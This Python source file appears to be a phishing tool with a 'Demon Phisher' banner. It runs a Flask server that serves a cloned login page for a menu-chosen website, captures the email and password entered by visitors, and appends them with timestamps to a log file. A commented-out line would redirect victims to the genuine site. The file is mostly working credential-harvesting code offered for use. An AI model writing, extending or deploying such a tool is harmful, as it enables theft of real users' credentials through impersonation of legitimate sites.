import time
from flask import Flask, render_template, request, redirect
from Menu import menu
from Websites import Sites
import shutil
import os

class FlaskApp:
    def __init__(self, choice):
        self.app = Flask (__name__)

        self.target = Sites.sites[choice - 1][0]
        print("Your Target Site: ", self.target)

        shutil.copyfile (f'./templates/{self.target}.html', './templates/index.html')

        @self.app.route ('/')
        # @self.app.route (f'/{self.target}', methods = ['GET'])
        def get_target():
            return render_template (f"{self.target}.html")

        def write_log (email, password):
            with open ('/tmp/log.log', 'at') as file:
                file.write ('+' + '-' * 58 + '+\n')
                file.write (f"WEBSITE: {self.target}\n");
                file.write (f"EMAIL : {email} \t PASSWORD: {password}\n")
                file.write (f"Logging Time: {time.asctime()} {time.tzname[0]}\n")
                file.write ('+' + '-' * 58 + '+\n')

        @self.app.route ('/', methods = ['POST'])
        def fetch_details ():
            email = request.form [Sites.sites[choice-1] [1] ['email']]
            password = request.form [Sites.sites [choice-1] [1] ['password']]

            write_log (email, password)
            return "You have been pished"
            # return redirect (Sites.sites [choice-1] [1]['url'])

        # SYNTAX STRUCTURE: app.run(host, port, debug, options)
        self.app.run()

if __name__ == '__main__':
    # app.run()
    try:
        print (""" 					Welcome To
        ,'|"\    ,---.             .---.    .-. .-.    ,---.    .-. .-. ,-.    .---.  .-. .-.  ,---.   ,---.   
        | |\ \   | .-'   |\    /| / .-. )   |  \| |    | .-.\   | | | | |(|   ( .-._) | | | |  | .-'   | .-.\  
        | | \ \  | `-.   |(\  / | | | |(_)  |   | |    | |-' )  | `-' | (_)  (_) \    | `-' |  | `-.   | `-'/  
        | |  \ \ | .-'   (_)\/  | | | | |   | |\  |    | |--'   | .-. | | |  _  \ \   | .-. |  | .-'   |   (   
        /(|`-' / |  `--. | \  / | \ `-' /   | | |)|    | |      | | |)| | | ( `-'  )  | | |)|  |  `--. | |\ \  
        (__)`--'  /( __.' | |\/| |  )---'    /(  (_)    /(       /(  (_) `-'  `----'   /(  (_)  /( __.' |_| \)\ 
                (__)     '-'  '-' (_)      (__)       (__)     (__)                  (__)     (__)         (__)

        """)

        FlaskApp (menu())
    except Exception:
        pass
    finally:
        os.remove ('./templates/index.html')

